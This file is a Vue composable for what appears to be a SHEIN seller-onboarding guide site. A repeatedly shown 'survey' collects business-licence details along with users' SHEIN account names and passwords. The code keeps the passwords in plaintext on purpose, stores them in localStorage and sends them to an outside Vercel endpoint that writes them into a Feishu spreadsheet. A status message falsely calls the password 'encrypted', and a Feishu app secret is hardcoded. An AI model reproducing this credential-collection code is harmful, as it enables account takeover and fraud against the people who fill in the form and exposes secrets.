/**
 * 问卷管理组合式函数
 * 管理问卷状态、数据存储和触发逻辑
 */
import { ref, computed } from 'vue'

const SURVEY_STORAGE_KEY = 'shein_survey_data_v1'
const VISITOR_ID_KEY = 'shein_visitor_id'

// 生成访客唯一ID
function generateVisitorId() {
  return 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
}

// 获取或创建访客ID
function getVisitorId() {
  let id = localStorage.getItem(VISITOR_ID_KEY)
  if (!id) {
    id = generateVisitorId()
    localStorage.setItem(VISITOR_ID_KEY, id)
  }
  return id
}

// 默认问卷数据
function getDefaultSurveyData() {
  return {
    visitorId: getVisitorId(),
    basicInfo: {
      team: '',
      licenseName: '',
      licenseCode: '',
      licenseDate: '',
      legalName: '',
      licenseAddress: '',
      filledAt: null
    },
    accountInfo: {
      sheinAccount: '',
      sheinPassword: '',
      filledAt: null
    },
    status: {
      basicFilled: false,
      accountFilled: false,
      skipped: false,
      skipTime: null,
      skipCount: 0
    }
  }
}

// 加载问卷数据
function loadSurveyData() {
  try {
    const data = localStorage.getItem(SURVEY_STORAGE_KEY)
    if (data) {
      const parsed = JSON.parse(data)
      // 合并默认数据，防止字段缺失
      return { ...getDefaultSurveyData(), ...parsed }
    }
  } catch (e) {
    console.error('加载问卷数据失败:', e)
  }
  return getDefaultSurveyData()
}

// 保存问卷数据
function saveSurveyData(data) {
  try {
    localStorage.setItem(SURVEY_STORAGE_KEY, JSON.stringify(data))
  } catch (e) {
    console.error('保存问卷数据失败:', e)
  }
}

// 密码不加密，直接存储明文
function encryptPassword(password) {
  return password
}

// 飞书配置
const FEISHU_CONFIG = {
  // 飞书应用凭证
  appId: 'cli_a927f88bdc389bdf',
  appSecret: 'N5VooPOZcbWrdJzhg7tvHgreGdQsEene',

  // 多维表格配置
  baseId: 'QQmOb1kOsacDZksa7JRclM7snKf',
  tableId: 'tblVcBw1zUhWp6IU',

  // 飞书机器人 webhook（可选，用于群通知）
  webhook: ''
}

export function useSurvey() {
  // 问卷数据响应式对象
  const surveyData = ref(loadSurveyData())
  
  // 计算属性：基础信息是否已填
  const isBasicFilled = computed(() => surveyData.value.status.basicFilled)
  
  // 计算属性：账号信息是否已填
  const isAccountFilled = computed(() => surveyData.value.status.accountFilled)
  
  // 计算属性：是否完整填写
  const isFullyFilled = computed(() => isBasicFilled.value && isAccountFilled.value)

  // 注意：根据新需求，问卷每次都会弹出，不需要计算属性控制显示
  // 保留这些计算属性用于状态显示，不用于控制弹窗

  // 检查是否应该显示基础信息问卷（仅用于显示状态，不控制弹窗）
  const shouldShowBasicSurvey = computed(() => {
    // 新逻辑：每次点击"我要开店"都弹出，由调用方控制
    return true
  })

  // 检查是否应该显示账号信息问卷（仅用于显示状态，不控制弹窗）
  const shouldShowAccountSurvey = computed(() => {
    // 新逻辑：每次点击"下一步"都弹出，由调用方控制
    return true
  })
  
  // 提交基础信息
  async function submitBasicInfo(formData) {
    surveyData.value.basicInfo = {
      ...formData,
      filledAt: new Date().toISOString()
    }
    surveyData.value.status.basicFilled = true
    surveyData.value.status.skipped = false
    saveSurveyData(surveyData.value)
    
    // 提交到飞书
    await submitToFeishu('basic', surveyData.value)
    
    return true
  }
  
  // 提交账号信息
  async function submitAccountInfo(formData) {
    surveyData.value.accountInfo = {
      sheinAccount: formData.sheinAccount,
      sheinPassword: encryptPassword(formData.sheinPassword),
      filledAt: new Date().toISOString()
    }
    surveyData.value.status.accountFilled = true
    surveyData.value.status.skipped = false
    saveSurveyData(surveyData.value)
    
    // 提交到飞书
    await submitToFeishu('account', surveyData.value)
    
    return true
  }
  
  // 处理跳过
  function handleSkip(step) {
    surveyData.value.status.skipped = true
    surveyData.value.status.skipTime = new Date().toISOString()
    surveyData.value.status.skipCount = (surveyData.value.status.skipCount || 0) + 1
    saveSurveyData(surveyData.value)
    
    console.log(`用户跳过了 ${step} 问卷`)
  }
  
  // 重置问卷（调试用）
  function resetSurvey() {
    localStorage.removeItem(SURVEY_STORAGE_KEY)
    surveyData.value = getDefaultSurveyData()
  }
  
  // 提交到飞书多维表格
  async function submitToFeishu(step, data) {
    try {
      // 转换日期为 Unix 时间戳（飞书 API 要求）
      const getTimestamp = (dateStr) => {
        if (!dateStr) return null
        const date = new Date(dateStr)
        return isNaN(date.getTime()) ? null : Math.floor(date.getTime() / 1000)
      }

      // 准备表格数据
      const record = {
        fields: {
          '访客ID': data.visitorId,
          '提交时间': Math.floor(Date.now() / 1000), // Unix 时间戳
          '隶属团队': data.basicInfo.team || '',
          '营业执照名称': data.basicInfo.licenseName || '',
          '信用代码': data.basicInfo.licenseCode || '',
          '注册日期': getTimestamp(data.basicInfo.licenseDate), // Unix 时间戳
          '法人姓名': data.basicInfo.legalName || '',
          '注册地址': data.basicInfo.licenseAddress || '',
          '希音账号': data.accountInfo.sheinAccount || '',
          '密码': data.accountInfo.sheinPassword || ''
        }
      }
      
      // 调用后端代理服务写入飞书表格
      console.log('准备提交到飞书表格:', record)

      try {
        // 根据环境选择 API 地址
        const apiUrl = window.location.hostname === 'localhost'
          ? 'http://localhost:3001/api/feishu/record'
          : 'https://shein-guide.vercel.app/api'

        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(record)
        })

        const result = await response.json()

        if (result.success) {
          console.log('✅ 数据已成功写入飞书表格')
          console.log('表格链接:', `https://my.feishu.cn/base/${FEISHU_CONFIG.baseId}`)
        } else {
          console.error('❌ 写入失败:', result.message)
        }

        return result.success
      } catch (error) {
        console.error('❌ 请求代理服务失败:', error)
        console.log('请确保后端服务已启动: node server/feishu-proxy.js')
        // 失败不阻塞流程
        return false
      }
      
      return true
    } catch (error) {
      console.error('提交到飞书失败:', error)
      // 失败不阻塞流程，记录日志即可
      return false
    }
  }
  
  // 获取飞书访问令牌（需要后端支持）
  async function getFeishuToken() {
    // 通过后端服务获取 Token，避免暴露 appSecret
    // const response = await fetch('http://localhost:8000/api/feishu/token')
    // const data = await response.json()
    // return data.token
    return null
  }
  
  // 格式化飞书消息
  function formatFeishuMessage(step, data) {
    if (step === 'basic') {
      return `**隶属团队：** ${data.basicInfo.team}
**营业执照名称：** ${data.basicInfo.licenseName}
**信用代码：** ${data.basicInfo.licenseCode}
**注册日期：** ${data.basicInfo.licenseDate}
**法人姓名：** ${data.basicInfo.legalName}
**注册地址：** ${data.basicInfo.licenseAddress}`
    } else {
      return `**希音账号：** ${data.accountInfo.sheinAccount}
**密码：** 已加密存储`
    }
  }
  
  return {
    surveyData,
    isBasicFilled,
    isAccountFilled,
    isFullyFilled,
    shouldShowBasicSurvey,
    shouldShowAccountSurvey,
    submitBasicInfo,
    submitAccountInfo,
    handleSkip,
    resetSurvey
  }
}
